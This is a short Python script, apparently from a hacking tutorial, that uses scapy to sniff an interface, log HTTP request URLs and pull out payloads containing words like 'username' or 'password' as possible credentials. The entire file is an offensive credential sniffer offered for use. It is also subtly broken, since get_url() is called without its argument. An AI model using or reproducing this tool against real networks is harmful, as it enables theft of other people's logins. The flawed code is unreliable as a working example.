#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    # print(packet)
    if packet.haslayer(http.HTTPRequest):
        url = get_url()
        print("[+] HTTP Request >> " + url)

        # if packet.haslayer(scapy.Raw):
        #     # print(packet.show())
        #     # print(packet[scapy.Raw].load)
        #     load = packet[scapy.Raw].load
        #     # creating list of stuff which we're looking for
        #     keywords = ["username", "user", "login", "password", "pass"]
        #     for keyword in keywords:
        #         if keyword in load:
        #             print("\n\n [+] Possible Username/Password >> " + load + "\n\n")
        #             break
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n [+] Possible Username/Password >> " + login_info + "\n\n")


sniff("eth0")